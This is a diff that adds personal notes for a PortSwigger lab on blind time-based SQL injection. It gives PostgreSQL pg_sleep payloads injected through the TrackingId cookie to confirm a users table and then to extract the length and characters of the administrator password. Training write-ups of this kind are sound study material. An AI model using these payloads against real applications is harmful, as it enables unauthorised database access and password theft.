@@ -1,0 +1,37 @@
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
+Actions:
+1. Identify parameter.
+2. Determine database type.
+3. Trigger a timebased sql. Syntactically valid queries will result in a time delay. 
+4. The database contains a different table called users, with columns called username and password. Retrieve the administrator password and log in. 
+5. Develop python script to enumerate the password.
+
+
+Results:
+1. TrackingID.
+Cookie: TrackingId=be6IOn6gz7Lmtcx0'||(select+pg_sleep(10))--; session=TRLbmYHwzjww0pAQG6ZpkhnG6WrjZsTm
+2. Payload implies postgresql due to pg_sleep.
+3. Payloads:
+Create boolean query:
+TRUE - time delay of 5 seconds
+'||(select case when (1=1) THEN pg_sleep(5)END)--
+Cookie: TrackingId=be6IOn6gz7Lmtcx0'||(select+case+when+(1%3d1)+THEN+pg_sleep(5)END)--; session=TRLbmYHwzjww0pAQG6ZpkhnG6WrjZsTm
+FALSE - no time delay
+'||(select case when (1=0) THEN pg_sleep(5)END)--
+Cookie: TrackingId=be6IOn6gz7Lmtcx0'||(select+case+when+(1%3d0)+THEN+pg_sleep(5)END)--; session=TRLbmYHwzjww0pAQG6ZpkhnG6WrjZsTm
+
+Confirm users table exists:
+TRUE - table exists, so sleeps for 5 seconds.
+' || (select case when (username='administrator') THEN pg_sleep(5) else pg_sleep(-1) END from users)--
+Cookie: TrackingId=be6IOn6gz7Lmtcx0'||+(select+case+when+(username%3d'administrator')+THEN+pg_sleep(10)+else+pg_sleep(-1)+END+from+users)--; session=TRLbmYHwzjww0pAQG6ZpkhnG6WrjZsTm
+
+Enumerate length of administrator password:
+TRUE - the password si >19 and therefore sleeps for 5 seconds. It is not >20 so ends. 
+'|| (select case when (username='administrator' and LENGTH(password)>19) THEN pg_sleep(5) else pg_sleep(-1) END from users)--
+Cookie: TrackingId=be6IOn6gz7Lmtcx0'||+(select+case+when+(username%3d'administrator'+and+LENGTH(password)>20)+THEN+pg_sleep(5)+else+pg_sleep(-1)+END+from+users)--; session=TRLbmYHwzjww0pAQG6ZpkhnG6WrjZsTm
+
+4. Payload:
+' || (select case when (username='administrator' and substring(password,1,1)='a') THEN pg_sleep(10) else pg_sleep(-1) END from users)--
+
+See password_retrieval.py
